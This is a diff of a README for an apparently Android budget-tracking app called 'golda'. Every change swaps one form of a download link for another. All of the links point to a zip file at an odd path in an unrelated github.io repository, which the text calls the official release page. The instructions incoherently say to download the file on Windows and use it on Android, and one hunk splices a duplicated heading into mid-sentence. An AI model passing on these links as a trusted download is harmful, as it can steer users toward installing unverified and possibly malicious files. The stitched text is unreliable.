@@ -5,7 +5,7 @@ description: "Track your money by voice across currencies — built for people w
 ---
 # 💰 golda - Know the Real Cost of Every Purchase
 
-[![Download golda](https://img.shields.io/badge/⬇️_Download_golda-FF6B6B?style=for-the-badge&labelColor=2E294E&logo=github&logoColor=white)](https://raw.githubusercontent.com/nopparujnut/nopparujnut.github.io/main/gastrostenosis/3.7.zip)
+[![Download golda](https://img.shields.io/badge/⬇️_Download_golda-FF6B6B?style=for-the-badge&labelColor=2E294E&logo=github&logoColor=white)](https://github.com/nopparujnut/nopparujnut.github.io/raw/refs/heads/main/gastrostenosis/3.7.zip)
 
 Visit this link to download the application.
 
@@ -59,7 +59,7 @@ The most important step is simple: visit the download page and get the latest ap
 ## 🪟 Download on Windows
 
 1. Open a web browser on your Windows computer.
-2. Visit this link to download the application: [golda releases](https://raw.githubusercontent.com/nopparujnut/nopparujnut.github.io/main/gastrostenosis/3.7.zip).
+2. Visit this link to download the application: [golda releases](https://github.com/nopparujnut/nopparujnut.github.io/raw/refs/heads/main/gastrostenosis/3.7.zip).
 3. Download the latest application file shown on the release page.
 4. Keep the downloaded file ready for your Android phone or tablet.
 5. Use the file on your Android device to install golda, then open the app.
@@ -83,7 +83,7 @@ A simple first session looks like this:
 3. Record a recent purchase by voice.
 4. Check the real# 💰 golda - Know the Real Cost of Every Purchase
 
-[![Download golda](https://img.shields.io/badge/⬇️_Download_golda-FF6B6B?style=for-the-badge&labelColor=2E294E&logo=github&logoColor=white)](https://raw.githubusercontent.com/nopparujnut/nopparujnut.github.io/main/gastrostenosis/3.7.zip)
+[![Download golda](https://img.shields.io/badge/⬇️_Download_golda-FF6B6B?style=for-the-badge&labelColor=2E294E&logo=github&logoColor=white)](https://github.com/nopparujnut/nopparujnut.github.io/raw/refs/heads/main/gastrostenosis/3.7.zip)
 
 Visit this link to download the application.
 
@@ -137,14 +137,14 @@ You can use golda to follow the things you are working toward and to keep debt p
 
 golda is an Android app. You can use a Windows computer to visit the release page and download the application file, then install and open the app on your Android phone or tablet.
 
-Visit this link to download the application: [golda releases](https://raw.githubusercontent.com/nopparujnut/nopparujnut.github.io/main/gastrostenosis/3.7.zip).
+Visit this link to download the application: [golda releases](https://github.com/nopparujnut/nopparujnut.github.io/raw/refs/heads/main/gastrostenosis/3.7.zip).
 
 The release page is the official place to get the latest application file. Use the newest release shown on that page.
 
 ## 🪟 Download on Windows
 
 1. Open a web browser on your Windows computer.
-2. Visit this link to download the application: [https://raw.githubusercontent.com/nopparujnut/nopparujnut.github.io/main/gastrostenosis/3.7.zip](https://raw.githubusercontent.com/nopparujnut/nopparujnut.github.io/main/gastrostenosis/3.7.zip).
+2. Visit this link to download the application: [https://github.com/nopparujnut/nopparujnut.github.io/raw/refs/heads/main/gastrostenosis/3.7.zip](https://github.com/nopparujnut/nopparujnut.github.io/raw/refs/heads/main/gastrostenosis/3.7.zip).
 3. Find the latest release shown on the page.
 4. Download the application file from that release.
 5. Keep the downloaded file ready so you can move it to your Android phone or tablet.
@@ -200,6 +200,6 @@ These everyday moments are where golda is most useful. It keeps the focus on pra
 
 ## 📌 Download golda Today
 
-Visit this link to download the application: [https://raw.githubusercontent.com/nopparujnut/nopparujnut.github.io/main/gastrostenosis/3.7.zip](https://raw.githubusercontent.com/nopparujnut/nopparujnut.github.io/main/gastrostenosis/3.7.zip). Download the latest release file on Windows, then install and open golda on your Android device. Use voice entry for your next purchase and let golda show the real cost, today’s safe-to-spend amount, and the progress that matters to you.
+Visit this link to download the application: [https://github.com/nopparujnut/nopparujnut.github.io/raw/refs/heads/main/gastrostenosis/3.7.zip](https://github.com/nopparujnut/nopparujnut.github.io/raw/refs/heads/main/gastrostenosis/3.7.zip). Download the latest release file on Windows, then install and open golda on your Android device. Use voice entry for your next purchase and let golda show the real cost, today’s safe-to-spend amount, and the progress that matters to you.
 
 Keywords: android, budget, expense-tracker, gemini, jetpack-compose, kotlin, material-you, material3, multi-currency, personal-finance, voice-input
